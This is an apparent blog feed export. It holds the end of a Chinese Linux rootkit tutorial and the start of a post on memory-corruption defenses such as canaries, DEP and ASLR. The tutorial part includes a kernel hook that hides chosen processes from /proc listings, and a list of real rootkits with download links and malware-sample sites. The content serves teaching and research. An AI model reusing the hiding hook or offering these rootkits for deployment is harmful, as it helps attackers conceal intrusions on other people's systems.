&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;proc_readdir_new&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; file *filp, &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *dirent, filldir_t filldir)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    proc_filldir_orig = filldir;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return proc_readdir_orig(filp, dirent, proc_filldir_new);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//CALLBACK SECTION&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;proc_filldir_new&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *buf, &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *name, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; namelen, loff_t offset, u64 ino, &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; d_type)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; current_pid; i++) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        当检测到指定的需要隐藏的进程时，直接returned返回，即直接跳过这个进程的枚举&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;built_in&quot;&gt;strcmp&lt;/span&gt;(name, pids_to_hide[i])) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;built_in&quot;&gt;strcmp&lt;/span&gt;(name, &lt;span class=&quot;string&quot;&gt;&quot;rtkit&quot;&lt;/span&gt;)) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;0x8-Rootkit-Sample&quot;&gt;&lt;a href=&quot;#0x8-Rootkit-Sample&quot; class=&quot;headerlink&quot; title=&quot;0x8: Rootkit Sample&quot;&gt;&lt;/a&gt;0x8: Rootkit Sample&lt;/h3&gt;&lt;p&gt;1). adore-ng(lkm)。adore-ng不修改系统调用层的内容，而是通过修改VFS（Virtual Filesystem Switch)层的具体处理函数，如替换VFS层的 file_ops等函数，来实现信息隐藏目的。原理细节可参考：&lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/3879961.html#commentform&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;adore-ng learning&lt;/a&gt;. 下载： &lt;a href=&quot;https://packetstormsecurity.com/files/32843/adore-ng-0.41.tgz.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;adore-ng 0.41&lt;/a&gt;, &lt;a href=&quot;https://github.com/chonghw/adore-ng&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;adore-ng github for linux 2.6 and 3.x&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2). knark(Hooking system call). 行为：隐藏或显示文件或目录； 隐藏TCP或UDP连接；程序执行重定向；非授权地用户权限增加(“rootme”)； 改变一个运行进程的UID/GID的工具；非授权地、特权程序远程执行守护进程(后门端口)；Kill –31: 隐藏运行的进程；调用表修改: rootkit通过修改导出的系统调用表，对与攻击行为相关的系统调用进行替换，隐藏攻击者的行踪。 原理细节可参考： &lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/3879961.html#commentform&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;kark learning&lt;/a&gt; .下载：&lt;a href=&quot;https://packetstormsecurity.com/files/24853/knark-2.4.3.tgz.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;knark download&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;3).suckit(DKOM). 行为：采用动态隐藏的方式来隐藏指定的内容，包括文件、进程、以及网络连接。suckit不同于其它基于lkm的hooking rootkit，没有修改系统调用表的内容，而是首先拷贝了系统调用表，然后将拷贝的系统调用表按照攻击者的意图进行修改执行攻击者改写的系统调用响应函数,然后将system_call（INT 80服务程序)从旧的系统调用表上移开，指向新的系统调用表. 有关suckit原理详细介绍，可参考: &lt;a href=&quot;http://www.hacker.com.cn/uploadfile/2013/0416/20130416020443596.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;suckit learning&lt;/a&gt;。  下载：&lt;a href=&quot;https://packetstormsecurity.com/files/40690/suckit2priv.tar.gz.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;suckit download&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其它rootkit samples还包括：&lt;a href=&quot;https://github.com/David-Reguera-Garcia-Dreg/enyelkm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;enyelkm&lt;/a&gt;,&lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/3879961.html#commentform&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;wnps&lt;/a&gt;, &lt;a href=&quot;https://github.com/cloudsec/brootkit&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;brootkit&lt;/a&gt;,(其中brootkit详细介绍可参考&lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/4321826.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;brookit analysis&lt;/a&gt;),  &lt;a href=&quot;https://packetstormsecurity.com/files/128945/Xingyiquan-Linux-2.6.x-3.x-Rootkit.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;xingyiquan&lt;/a&gt;,&lt;a href=&quot;https://packetstormsecurity.com/files/24482/Synapsys-lkm.tar.gz.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;synapsys&lt;/a&gt;, &lt;a href=&quot;http://average-coder.blogspot.com/2011/12/linux-rootkit.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Average coder analysis&lt;/a&gt;, &lt;a href=&quot;https://github.com/mfontanini/Programs-Scripts/tree/master/rootkit&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Average coder download&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x9-Rootkit-Resources&quot;&gt;&lt;a href=&quot;#0x9-Rootkit-Resources&quot; class=&quot;headerlink&quot; title=&quot;0x9: Rootkit Resources&quot;&gt;&lt;/a&gt;0x9: Rootkit Resources&lt;/h3&gt;&lt;p&gt;列出一些rootkit学习相关资源，也是本文参考的主要来源，详见References。 rootkit出于本身恶意的原因，sample并不是那么好找，本文列出一些用于Research目的的malware站点，以便大家参考。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&gt;&amp;gt;Malware Research Source&lt;/p&gt;
&lt;p&gt; &lt;a href=&quot;http://contagiodump.blogspot.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://contagiodump.blogspot.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://zeltser.com/combating-malicious-software/malware-sample-sources.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://zeltser.com/combating-malicious-software/malware-sample-sources.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://forums.malwarebytes.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://forums.malwarebytes.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.offensivecomputing.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.offensivecomputing.net/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://cve.mitre.org/compatible/requirements.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://cve.mitre.org/compatible/requirements.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://packetstormsecurity.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://packetstormsecurity.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;a href=&quot;https://github.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3 id=&quot;0xA-Acknowledgement&quot;&gt;&lt;a href=&quot;#0xA-Acknowledgement&quot; class=&quot;headerlink&quot; title=&quot;0xA: Acknowledgement&quot;&gt;&lt;/a&gt;0xA: Acknowledgement&lt;/h3&gt;&lt;p&gt;本文有许多知识来源于 Phd shiqing以及新浪微博用户@Littlehann 两位大神的指点。&lt;/p&gt;
&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;转载本文请注明出处:&lt;a href=&quot;http://www.chongh.wiki/blog/2016/03/07/rootkit-tutorial/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/03/07/rootkit-tutorial/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者[新浪微博：@diting0x]&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;0xB-References&quot;&gt;&lt;a href=&quot;#0xB-References&quot; class=&quot;headerlink&quot; title=&quot;0xB: References&quot;&gt;&lt;/a&gt;0xB: References&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://www.ists.dartmouth.edu/library/409.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Detecting kernel rootkits&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.usenix.org/legacy/event/hotbots07/tech/full_papers/chiang/chiang_html/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;A Case Study of the Rustock Rootkit and Spam Bot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.invisiblethings.org/papers/2006/rutkowska_malware_taxonomy.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Introducing Stealth Malware Taxonomy&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cs.rutgers.edu/~iftode/SystemicThreats07.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Kernel rootkit classification&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/3870974.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux Rootkit Learning&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/3910696.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Rootkit Hacking Technology &amp;amp;&amp;amp; Defence Strategy Research&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.phrack.org/archives/issues/58/6.txt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Advances in Kernel Hacking&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://althing.cs.dartmouth.edu/local/vsc07.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Runtime kernel kmem patching&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.blackhat.com/presentations/bh-europe-09/Lineberry/BlackHat-Europe-2009-Lineberry-code-injection-via-dev-mem.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Malicious Code Injection via /dev/mem&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://turbochaos.blogspot.hk/2013/10/writing-linux-rootkits-301_31.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Modern Linux Rootkits 301 - Bypassing modules_disabled security&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.phrack.org/archives/issues/59/4.txt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Handling Interrupt Descriptor Table for fun and profit:&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.phrack.org/archives/issues/61/7.txt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hijacking Linux Page Fault Handler: Exception Table&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.phrack.org/archives/issues/61/14.txt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Kernel Rootkit Experiences&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.phrack.org/archives/issues/65/8.txt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Mistifying the debugger&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.thc.org/papers/LKM_HACKING.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Complete Linux Loadable Kernel Modules&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.phrack.org/archives/issues/52/18.txt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Weakening the Linux Kernel&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.freebuf.com/articles/system/54263.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux Rootkit系列一：LKM的基础编写及隐藏&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://ab-rtfm.blogspot.com/2007/07/explorations-with-adore-ng.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Explorations with adore-ng&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/3879961.html#commentform&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux Rootkit Sample &amp;amp;&amp;amp; Rootkit Defenser Analysis&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.hacker.com.cn/uploadfile/2013/0416/20130416020443596.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Suckit技术原理&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;a href=&quot;http://labs.lastline.com/high-resolution-dynamic-analysis-of-windows-kernel-rootkits&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;High-Resolution Dynamic Analysis of Windows Kernel Rootkits&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://labs.lastline.com/dissecting-turla-rootkit-malware-using-dynamic-analysis&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Dissecting Turla Rootkit Malware Using Dynamic Analysis&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://securityintelligence.com/detecting-and-analyzing-kernel-based-malware/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Detecting and Analyzing Kernel-Based Malware&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://phrack.org/issues/58/7.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;suckit: Linux on-the-fly kernel patching without LKM&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://la-samhna.de/library/rootkits/basics.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux Kernel Rootkits&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.symantec.com/avcenter/reference/when.malware.meets.rootkits.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;When Malware Meets Rootkits&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/3854977.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux System Calls Hooking Method Summary&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://opensecuritytraining.info/Rootkits.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://opensecuritytraining.info/Rootkits.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.linux-magazine.com/Online/Features/Kernel-Rootkit-Tricks&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Kernel Rootkit Tricks&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;0x1: Definition of rootkit &lt;/li&gt;
&lt;li&gt;0x2: Classification of Rootkit&lt;/li&gt;
&lt;li&gt;0x3: Hooking(Kernel Object Hooking) Rootkit&lt;/li&gt;
&lt;li&gt;0x4: DKOM Rootkit&lt;/li&gt;
&lt;li&gt;0x5: Rootkit Objectives&lt;/li&gt;
&lt;li&gt;0x6: Example-Module Hiding&lt;/li&gt;
&lt;li&gt;0x7: Example-Process Hiding&lt;/li&gt;
&lt;li&gt;0x8: Rootkit Samples&lt;/li&gt;
&lt;li&gt;0x9: Rootkit Resources&lt;/li&gt;
&lt;li&gt;0xA: Acknowledgement&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="rootkit" scheme="http://yoursite.com/categories/rootkit/"/>
    
    
      <category term="Security" scheme="http://yoursite.com/tags/Security/"/>
    
      <category term="Attack" scheme="http://yoursite.com/tags/Attack/"/>
    
      <category term="Rootkit" scheme="http://yoursite.com/tags/Rootkit/"/>
    
      <category term="Malware" scheme="http://yoursite.com/tags/Malware/"/>
    
      <category term="Kernel" scheme="http://yoursite.com/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>内存持久战-防御机制</title>
    <link href="http://yoursite.com/blog/2016/02/23/memorywar-defense/"/>
    <id>http://yoursite.com/blog/2016/02/23/memorywar-defense/</id>
    <published>2016-02-23T16:54:07.000Z</published>
    <updated>2016-04-21T20:54:57.000Z</updated>
    
    <content type="html">&lt;p&gt;继前两篇文章 &lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/17/memory-safety/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;内存持久战-内存安全性&lt;/a&gt;, &lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/18/memorywar-attack/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;内存持久战-攻击模型&lt;/a&gt;, 再加上防御措施，才能算是完整的内存战争。本文首先介绍目前广泛部署的防御机制，然后根据 &lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/18/memorywar-attack/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;内存持久战-攻击模型&lt;/a&gt; 每一步实施的攻击破坏介绍相对应的防御细节。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;广泛部署的防御机制&quot;&gt;&lt;a href=&quot;#广泛部署的防御机制&quot; class=&quot;headerlink&quot; title=&quot;广泛部署的防御机制&quot;&gt;&lt;/a&gt;广泛部署的防御机制&lt;/h3&gt;&lt;p&gt;目前广泛部署的防御机制有栈粉碎性保护（Stack smashing protection)，DEP/W⊕X以及ASLR(Address Space Layout Randomization)。针对Windows平台，也提出了一些特殊的机制，比如 SafeSEH 与 SEHOP 用来保护堆的元数据和异常处理器。&lt;/p&gt;
&lt;p&gt;栈粉碎性保护,SafeSEH以及SEHOP的基本思想是在返回地址与缓冲区(比如函数入口）之间放置随机数作为哨兵（称为cookie或canary),在函数返回前先检测哨兵的值是否被篡改，以达到检测缓冲区溢出攻击的目的。这些机制都属于代码指针保护方式（code pointer integrity),主要检测一些特殊代码指针，如栈上的返回地址、异常处理器指针的完整性，然而对于直接修改（比如索引错误）却无能为力。有关stack smashing 可参考这篇文章 &lt;a href=&quot;http://www.drdobbs.com/security/anatomy-of-a-stack-smashing-attack-and-h/240001832?pgno=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Anatomy of a Stack Smashing Attack and How GCC Prevents It
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;W⊕X（write XOR executable)属于DEP（data execution prevention)的子集，是不可执行数据（Non-executable data）与代码完整性(code integrity)的结合。所有现代CPU都支持设置不可执行页面权限，结合不可写代码权限，就可以实施W⊕X机制，很简单也很实际。然而无法防御ROP（return oriented programming),ROP指的是在将现有代码中的可复用代码（可以是现有的函数）以及一些指令序列（gadgets)连接起来实施恶意操作。有关ROP可参考这篇文章，&lt;a href=&quot;https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Return-oriented Programming:&lt;br&gt;Exploitation without Code Injection&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;ASLR在下文会详细描述。&lt;/p&gt;
&lt;h3 id=&quot;防御机制Step-by-step&quot;&gt;&lt;a href=&quot;#防御机制Step-by-step&quot; class=&quot;headerlink&quot; title=&quot;防御机制Step-by-step&quot;&gt;&lt;/a&gt;防御机制Step-by-step&lt;/h3&gt;&lt;p&gt;从目前提出的所有防御机制来看，可将其划分为两大类：概率性以及确定性防御。概率性机制用来随机化一些对象，如ISR(Instruction Set Randomization), ASLR(Address Space Layout Randomizatioin)以及DSR(Data Space Randomization),可选手段相对较少。 确定性防御机制实施reference monitor, 有关reference monitor的定义可参考，&lt;a href=&quot;https://en.wikipedia.org/wiki/Reference_monitor&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;wikipedia page on reference monior&lt;/a&gt;,主要就是在参考验证机制上定义了一些设计要求。 其主要利用静态与动态注入技术，静态注入可在编译阶段实施，动态注入需要在运行时加入代码，损耗相对较大。有关注入技术，可参考我前面的文章 &lt;a href=&quot;http://www.chongh.wiki/blog/2015/12/18/pin-for-dynamic-binary-instrumentation/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;PIN for Dynamic Binary Instrumentation&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;下面将针对攻击模型中实施的每个步骤介绍相对应的防御机制，每种防御机制对应每一步的攻击过程。&lt;br&gt;可以先去回顾一下 &lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/18/memorywar-attack/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;内存持久战-攻击模型&lt;/a&gt; 的完整实施过程。注意，以下介绍的防御机制并没有时序关系,以横向关系依次描述。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 1&amp;amp;2: Memory safety.&lt;/em&gt;&lt;/strong&gt; 考虑完整的内存安全性，空间错误和时域错误都需要阻止。类型安全（Type-safe)的语言通过检查数组边界并使用自动垃圾回收来实施空间与时域安全性。对于非类型安全语言，可嵌入reference monitor针对非安全代码实施类似的策略，对象可以是源码、中间语言、二进制。&lt;/p&gt;
&lt;p&gt;针对空间安全，可跟踪指针边界，将指针结构体的表示方法扩展，加入额外信息。但是这种需要源码标注(annotation)，对于庞大的代码基是不实用的，甚至会改变内存结构带来二进制兼容性问题。可参考 &lt;a href=&quot;https://www.cs.virginia.edu/~weimer/p/p477-necula.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CCured&lt;/a&gt; 项目。为解决兼容性问题，越来越多研究者开始追踪对象边界，不但要知道对象分配的内存区域边界，并利用指针运算而不是引用指针来保护指针边界。&lt;/p&gt;
&lt;p&gt;然而，检测边界并不能解决use-after-free, double-free(use-after-free的特列)问题. 此时，实施时域安全可作为补充。1）特殊的分配器：释放的内存只能被同类型对象重用并对齐。此策略可阻止user-after-free攻击，但对dangling pointers无效；2）基于对象的方法：利用影子内存标记每一块释放的内存位置，如果访问最近被释放的空间就能被检测到。著名的Valgrind内存检测就是利用此方法来检测user-after-free错误的。有关Valgrind的内存检测技术将会在后续的文章&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/20/valgrind-memory/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Valgrind内存检测&lt;/a&gt; 详细介绍。如果标记的内存区域重新被新的指针指向，对其的非法访问就检测不到了；3）基于指针的方法：同时维护指针的边界信息与内存分配信息实施全面的内存安全。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Step 3: 代码完整性(code integrity, 对应修改代码),代码指针完整性(code pointer integrity，对应修改代码指针)以及数据完整性（data integrity，对应修改数据变量).&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
